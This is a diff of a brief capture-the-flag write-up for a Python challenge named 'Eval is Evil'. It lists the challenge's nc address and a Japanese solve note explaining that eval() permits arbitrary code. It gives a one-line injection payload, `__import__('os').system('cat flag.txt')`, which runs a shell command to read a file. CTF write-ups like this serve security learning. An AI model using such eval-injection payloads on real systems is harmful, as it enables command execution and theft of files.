@@ -1,7 +1,6 @@
 # Eval is Evil
 
 If eval is so bad, then why is it so easy to use?
-
 nc evalisevil.kctf-453514-codelab.kctf.cloud 1337
 
 chall.py 
@@ -34,6 +33,7 @@ main()
 
 
 ## solve
+
 - eval() 関数を使っているので、数字以外の任意のPythonコードを実行できる
 
 `__import__('os').system('cat flag.txt')`
